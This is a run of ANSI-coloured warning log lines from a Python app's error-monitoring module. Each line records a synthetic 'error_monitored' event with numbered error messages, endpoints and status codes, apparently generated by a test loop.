WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2498'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2499'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2500'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821215Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2501'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821267Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2502'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2503'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821368Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2504'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2505'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821466Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2506'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2507'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821563Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2508'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821613Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2509'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821661Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2510'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2511'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821757Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2512'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821805Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2513'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2514'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2515'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.821956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2516'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822004Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2517'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2518'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2519'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2520'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2521'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2522'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822374Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2523'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2524'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822479Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2525'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822532Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2526'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822582Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2527'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822631Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2528'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2529'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822727Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2530'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2531'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822885Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2532'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.822947Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2533'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823000Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2534'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2535'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2536'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823150Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2537'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
